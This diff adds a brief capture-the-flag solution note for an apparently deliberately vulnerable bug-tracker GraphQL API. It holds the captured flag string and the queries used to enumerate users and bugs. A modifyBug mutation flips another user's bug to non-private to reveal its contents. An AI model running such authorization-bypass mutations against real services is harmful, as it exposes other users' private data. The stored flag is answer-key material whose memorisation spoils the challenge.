@@ -1,0 +1,58 @@
+^FLAG^d919a0f0353a0f20ee335b6cea5934713f72a32591a018e7a810d7642cadf675$FLAG$
+
+Had to Google that last bit on how to use the Mutation properly
+
+Execute the modifyBug mutation with id 2 and private set to false. this will make user id 2 bugs to private=false. and run bugs query and flag can be seen.
+
+query users {
+  user {
+    edges {
+      node {
+	id
+	username
+      }
+    }
+  }
+}
+
+query bugs {
+  allBugs {
+    id
+    text
+    private
+    reporter {
+      id
+      username
+    }
+    reporterId
+  }
+}
+
+query allusers {
+  findBug(_:"QnVnczox") {
+    id
+    text
+    private
+    reporter {
+      id
+      username
+    }
+    reporterId
+  }
+}
+
+mutation modbug {
+  modifyBug(id:2, private:false) {
+    bug {
+      id
+      text
+      private
+      reporter {
+        id
+        username
+      }
+      reporterId
+    }
+  }
+}
+		
